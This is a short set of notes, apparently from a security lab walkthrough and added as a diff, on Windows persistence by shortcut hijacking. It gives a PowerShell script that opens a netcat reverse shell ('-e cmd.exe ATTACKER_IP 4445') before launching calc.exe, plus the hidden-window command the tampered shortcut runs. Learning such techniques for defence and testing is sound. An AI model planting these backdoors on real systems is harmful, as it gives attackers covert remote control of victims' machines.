@@ -1,0 +1,17 @@
+Shortcut Files
+If we don't want to alter the executable, we can always tamper with the shortcut file itself. 
+Instead of pointing directly to the expected executable, we can change it to point to a script that will run a backdoor 
+and then execute the usual program normally.
+
+For this task, let's check the shortcut to calc on the Administrator's desktop. 
+
+If we right-click it and go to properties, we'll see where it is pointing:
+
+Let's create a simple Powershell script in "C:\Windows\System32" or any other sneaky location. 
+The script will execute a reverse shell and then run calc.exe from the original location on the shortcut's properties:
+
+    -Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
+    C:\Windows\System32\calc.exe
+
+    -Powershell: Cchange the shortcut to point to our script
+        -powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
